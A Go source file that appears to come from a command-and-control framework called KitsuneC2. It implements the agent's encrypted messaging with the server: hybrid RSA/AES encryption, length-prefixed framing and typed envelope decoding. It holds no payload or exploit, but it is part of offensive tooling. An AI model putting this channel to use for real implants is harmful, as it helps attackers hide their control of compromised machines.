package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"net"
	"reflect"
)

const (
	publicKey string = "MIIBCgKCAQEApBu0qZ45NuQ5WQ1TAtnKR45Joj3JvaT+umIOysCiUXB+IOs7cUjY1Pqmnt61x78+gBV+jBI5eQIPO9ZaAtxLlBjFAZza8YvMgUr4csqMC1yn/hBi7O80qhROE+7XCwCsn8snfCvjX72wQ7YbcEuPs4vLU+loVPyjyTBvnvgpveciozDK0xpVLt9fdMgmJn5VgvIG+5VleVve2PSrZinOGng8FvjsGV0gvQ6NbUyylyF4Ncov/nNYr9d39UJpSK6pTIA/GysE4V8IMO2tlccbo7ovNqulPCr2BYFxktaUolkw1wZ5TeNvxZ/NodHIxzTArVEt8cJqR98XjwdAYuYYpwIDAQAB"
)

var (
	sessionKey []byte //generated randomly on each "SendEnvelopeToServer" call
)

// generates new 256-bit AES sessionKey, and encrypts the envelope datastructure with it. Then it encrypts the generated AES key
// using an RSA public key. The encryptes AES-key + encrypted envelope get sent over the wire as follows:
// Message = uint32(message length) - uint32(encryptedAESkey length) - encryptesAESkey - encryptedEnvelope
func SendEnvelopeToServer(connection net.Conn, messageType int, data interface{}) error {
	newSessionKey := cryptography.GenerateRandomBytes(32) //generate new sessionKey
	encryptedJson, err := communication.PackAndEncryptEnvelope(messageType, data, newSessionKey)
	if err != nil {
		return err
	}

	pubKey, err := cryptography.StringToRsaPublicKey(publicKey)
	if err != nil {
		return err
	}
	encryptedSessionKey, err := cryptography.EncryptWithRsaPublicKey(newSessionKey, pubKey)
	if err != nil {
		return err
	}

	//create a buffer and: Append total message length, append length of RSA-encrypted session key, append RSA-encrypted session key
	//append AES encrypted envelope
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedJson)+len(encryptedSessionKey)+4))
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedSessionKey)))
	buffer.Write(encryptedSessionKey)
	buffer.Write(encryptedJson)

	err = communication.WriteToSocket(connection, buffer.Bytes())
	if err != nil {
		return err
	}

	sessionKey = newSessionKey //only if everything went ok, dump our current sessionKey and set it to the new one.

	return nil
}

// Reads the first 4 bytes (uint32) from socket (message length). The reads the entire encrypted message. Afterwards, the function decrypts the message
// and attempts to unmarshal the resulting JSON into a Envelope object.
func ReceiveEnvelopeFromServer(connection net.Conn) (int, interface{}, error) {
	messageLengthAsBytes, err := communication.ReadFromSocket(connection, 4)
	if err != nil {
		return -1, nil, err
	}
	messageLength := binary.LittleEndian.Uint32(messageLengthAsBytes)

	cipherText, err := communication.ReadFromSocket(connection, int(messageLength))
	if err != nil {
		return -1, nil, err
	}
	rawJsonAsBytes, err := cryptography.DecryptAes(cipherText, sessionKey)
	if err != nil {
		return -1, nil, err
	}

	var messageEnvelope *communication.Envelope = new(communication.Envelope)
	err = json.Unmarshal(rawJsonAsBytes, messageEnvelope)
	if err != nil {
		return -1, nil, err
	}

	dataAsStruct := communication.MessageTypeToStruct[messageEnvelope.MessageType]()
	err = json.Unmarshal(messageEnvelope.Data, dataAsStruct)
	if err != nil {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	//use reflection to check that MessageType and data correspond correctly.
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[messageEnvelope.MessageType]())
	dataType := reflect.TypeOf(dataAsStruct)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	return messageEnvelope.MessageType, dataAsStruct, nil
}
